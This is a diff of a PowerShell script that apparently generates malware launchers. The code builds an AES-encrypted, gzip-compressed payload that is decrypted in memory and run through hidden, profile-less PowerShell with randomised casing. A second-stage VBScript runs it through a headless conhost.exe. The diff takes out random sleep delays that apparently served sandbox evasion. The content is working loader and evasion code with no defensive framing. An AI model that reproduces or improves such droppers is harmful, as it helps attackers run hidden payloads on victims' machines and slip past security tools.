@@ -320,34 +320,16 @@ function New-PowershellLauncher {
     $powerShellCmd = [System.Collections.Generic.List[string]]::new()
     $powerShellCmd.Add("`$$encryptedPayloadVar=`'$([Convert]::ToBase64String($encrypted))`';")
     $powerShellCmd.Add("`$$keyVar=`'$([Convert]::ToBase64String($key))`';`$$IVVar=`'$([Convert]::ToBase64String($IV))`';")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
-    }
     $powerShellCmd.Add("`$$aesVar=[System.Security.Cryptography.AesManaged]::new();`$$aesVar.Mode=[System.Security.Cryptography.CipherMode]::CBC;")
     $powerShellCmd.Add("`$$aesVar.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
-    }
     $powerShellCmd.Add("`$$aesVar.Key=[Convert]::FromBase64String(`$$keyVar);`$$aesVar.IV=[Convert]::FromBase64String(`$$IVVar);")
     $powerShellCmd.Add("`$$payloadBytesVar=[Convert]::FromBase64String(`$$encryptedPayloadVar);")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
-    }
     $powerShellCmd.Add("`$$decryptedVar=`$$aesVar.CreateDecryptor().TransformFinalBlock(`$$payloadBytesVar, 0, `$$payloadBytesVar.Length);")
     $powerShellCmd.Add("`$$inputStreamVar=[System.IO.MemoryStream]::new(`$$decryptedVar);")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
-    }
     $powerShellCmd.Add("`$$decompressorVar=[System.IO.Compression.GzipStream]::new(`$$inputStreamVar,[System.IO.Compression.CompressionMode]::Decompress);")
     $powerShellCmd.Add("`$$outputStreamVar=[System.IO.MemoryStream]::new();`$$decompressorVar.CopyTo(`$$outputStreamVar);")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
-    }
     $powerShellCmd.Add("`$$decompressorVAr.Dispose();`$$inputStreamVar.Dispose();")
     $powerShellCmd.Add("`$$decompressedVar=[Convert]::ToBase64String(`$$outputStreamVar.ToArray());")
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
-    }
     $powerShellCmd.Add("$(Set-RandomUppercase -String "powershell.exe") -w 1 -nop -nol -enc `$$decompressedVar;")
     -join $powerShellCmd
 }
@@ -357,9 +339,6 @@ function New-SecondStageVBLauncher {
         [string]$Payload
     )
     $vbScript = [System.Collections.Generic.List[string]]::new()
-    if (Get-Random -Minimum 0 -Maximum 2) {
-        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
-    }
     $vbScript.Add("Set objShell = CreateObject(`"WScript.Shell`"):")
     $vbScript.Add("objShell.Run `"conhost.exe --headless powershell.exe -w 1 -nop -nol -C $Payload`":")
     $vbScript
